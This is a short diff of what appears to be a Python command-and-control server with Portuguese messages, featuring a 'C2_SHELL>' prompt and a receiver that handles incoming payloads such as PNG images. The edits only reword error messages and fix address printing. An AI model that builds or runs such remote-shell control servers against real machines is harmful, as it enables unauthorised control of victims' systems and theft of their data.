@@ -11,7 +11,7 @@ def receive_handler(client_socket):
         try:
             payload = protocolo.receber_mensagem(client_socket)
             if payload is None:
-                print("\n[-] Conexão encerrada ou payload inválido.\nC2_SHELL> ", end="", flush=True)
+                print("\n[-] Conexão encerrada pelo cliente ou payload inválido.\nC2_SHELL> ", end="", flush=True)
                 break
             
             if payload.startswith(b'\x89PNG\r\n\x1a\n'):
@@ -26,7 +26,7 @@ def receive_handler(client_socket):
         except socket.timeout:
             continue
         except OSError:
-            print("\n[-] Erro de E/S no socket.")
+            print("\n[-] Erro de E/S no socket de recepção.")
             break
 
 def start_server():
@@ -43,7 +43,8 @@ def start_server():
         
     try:
         client_socket, client_address = server.accept()
-        print(f"[+] Conexão aceita de {client_address}:{client_address}")
+        print(f"[+] Conexão aceita de {client_address[0]}:{client_address[1]}")
+        
         client_socket.settimeout(1.0)
         
         recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
@@ -62,8 +63,8 @@ def start_server():
                     break
             except KeyboardInterrupt:
                 break
-            except OSError as e_envio:
-                print(f"[-] Erro de envio: {e_envio}")
+            except OSError:
+                print("[-] Erro de envio no socket principal.")
                 break
                     
     finally:
